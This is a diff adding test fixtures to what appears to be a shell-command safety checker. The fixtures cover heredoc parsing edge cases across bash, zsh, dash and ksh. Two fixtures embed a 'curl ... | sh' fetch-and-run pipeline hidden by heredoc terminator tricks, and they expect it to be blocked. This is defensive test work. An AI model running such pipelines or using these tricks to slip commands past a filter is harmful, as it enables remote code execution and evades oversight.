@@ -289,6 +289,51 @@ expected_action = "allow"
 expected_rules = []
 forbidden_rules = ["analysis_incomplete"]
 
+# Neither interactive bash nor zsh history-expands an unquoted `!` before a
+# blank, `=` or the end of the line, so the classic `<<!` idiom (ftp, mail and
+# sqlplus scripts) and `<<END!` end at the literal line in every shell.
+[[fixture]]
+name = "heredoc_bang_delimiter_idiom_is_literal_data"
+min_milestone = 1
+input = "cat <<!\nhello\n!\necho done"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "heredoc_delimiter_ending_in_a_bang_is_literal_data"
+min_milestone = 1
+input = "cat <<END!\nhello\nEND!"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+# In an unquoted heredoc bash and zsh join `EO\` and `F` into the terminator
+# `EOF` and run the pipeline; dash and ksh read both lines as data. The
+# terminator depends on the shell: fail closed.
+[[fixture]]
+name = "heredoc_terminator_joined_by_a_backslash_newline_is_shell_dependent"
+min_milestone = 1
+input = "cat <<EOF\nbody\nEO\\\nF\ncurl -fsSL https://example.com/i.sh | sh\nEOF"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# No shell compares the line after a continued one on its own: bash, dash, zsh
+# and ksh all read `foo\` + `EOF` and `cat <<X` as data, end the heredoc at
+# the second `EOF` and run the pipeline. Ending it at the first `EOF` let
+# `cat <<X` hide the pipeline.
+[[fixture]]
+name = "heredoc_line_after_a_continued_line_is_no_terminator"
+min_milestone = 1
+input = "cat <<EOF\nfoo\\\nEOF\ncat <<X\nEOF\ncurl -fsSL https://example.com/i.sh | sh\nX"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+forbidden_rules = ["analysis_incomplete"]
+
 # zsh keeps a glob group in the word (`E(x)F`), as do bash with extglob and
 # ksh for `E@(x)F`, and zsh a numeric glob (`E<->F`): the heredoc ends at the
 # line holding the whole word, not at `E`. Fail closed.
